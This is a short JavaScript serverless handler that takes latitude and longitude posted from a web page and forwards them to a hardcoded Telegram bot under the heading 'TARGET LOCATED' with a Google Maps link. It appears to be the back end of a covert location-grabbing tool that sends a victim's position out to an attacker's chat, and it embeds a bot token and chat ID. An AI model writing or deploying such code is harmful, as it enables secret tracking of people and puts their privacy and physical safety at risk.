export default async function handler(req, res) {
  if (req.method === 'POST') {
    try {
      const { lat, lon } = JSON.parse(req.body);
      const token = '8999786868:AAE-U4z0bEc7U9URlYUCGTrqs5c5g-jRVFw'; 
      const chatId = '8995886457';
      
      const response = await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ 
          chat_id: chatId, 
          text: `📍 TARGET LOCATED\nLat: ${lat}\nLon: ${lon}\nMaps: https://www.google.com/maps?q=${lat},${lon}` 
        })
      });
      
      res.status(200).json({ status: 'success' });
    } catch (error) {
      res.status(500).json({ status: 'error', message: error.message });
    }
  } else {
    res.status(405).json({ status: 'method not allowed' });
  }
}

        
